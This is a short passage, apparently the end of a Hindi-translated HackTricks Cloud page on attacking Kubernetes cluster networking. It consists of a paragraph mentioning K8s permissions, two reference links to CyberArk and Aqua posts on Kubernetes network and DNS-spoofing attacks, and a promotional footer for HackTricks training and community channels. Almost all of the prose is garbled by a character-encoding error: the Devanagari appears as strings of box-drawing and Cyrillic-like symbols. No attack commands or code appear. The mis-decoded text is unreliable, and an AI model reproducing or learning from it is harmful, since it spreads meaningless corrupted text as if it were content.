рдпрд╣ рдЪрдпрдирд┐рдд рдкреЙрдб рдореЗрдВ рдПрдЬреЗрдВрдЯреНрд╕ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░реЗрдЧрд╛ рдФрд░ рдЙрдирдХрд╛ рдЯреНрд░реИрдлрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдЗрдХрдЯреНрдард╛ рдХрд░реЗрдЧрд╛ рдФрд░ рдЖрдкрдХреЛ рдПрдХ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдореЗрдВ рджрд┐рдЦрд╛рдПрдЧрд╛ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдкрдХреЛ рдЗрд╕рдХреЗ рд▓рд┐рдП рдЙрдЪреНрдЪ K8s рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдЪрд╛рд╣рд┐рдП рд╣реЛрдВрдЧреА (рдФрд░ рдпрд╣ рдмрд╣реБрдд рдЧреБрдкреНрддрдЪрд░ рдирд╣реАрдВ рд╣реИ)ред

## рд╕рдВрджрд░реНрдн

* [https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1)
* [https://blog.aquasec.com/dns-spoofing-kubernetes-clusters](https://blog.aquasec.com/dns-spoofing-kubernetes-clusters)

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ PRs рдЬрдорд╛ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВред

</details>
{% endhint %}
